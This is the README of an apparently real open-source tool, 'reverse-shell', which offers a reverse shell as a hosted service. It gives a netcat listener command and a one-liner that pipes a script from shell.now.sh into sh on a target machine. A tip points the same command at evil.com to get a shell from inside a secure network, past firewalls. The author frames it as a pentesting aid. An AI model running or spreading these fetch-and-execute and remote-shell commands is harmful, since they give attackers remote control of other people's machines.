# reverse-shell

> Reverse Shell as a Service

[![Build Status](https://travis-ci.org/lukechilds/reverse-shell.svg?branch=master)](https://travis-ci.org/lukechilds/reverse-shell)
[![Coverage Status](https://coveralls.io/repos/github/lukechilds/reverse-shell/badge.svg?branch=master)](https://coveralls.io/github/lukechilds/reverse-shell?branch=master)
[![npm](https://img.shields.io/npm/v/reverse-shell.svg)](https://www.npmjs.com/package/reverse-shell)

Easy to remember reverse shell that should work on most Unix-like systems.

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target

On the target machine, pipe the output of https://shell.now.sh/yourip:port into sh.

```shell
curl https://shell.now.sh/192.168.0.69:1337 | sh
```

### 3. Don't be a dick

This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.

## Demo

<img src="https://i.imgur.com/qEZBDq5.gif" width="1082">

## Tip

You can use a hostname or an IP. Because this is a reverse connection it can punch through firewalls and connect to the internet.

e.g You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:

```shell
curl https://shell.now.sh/evil.com:1337 | sh
```

## License

MIT © Luke Childs
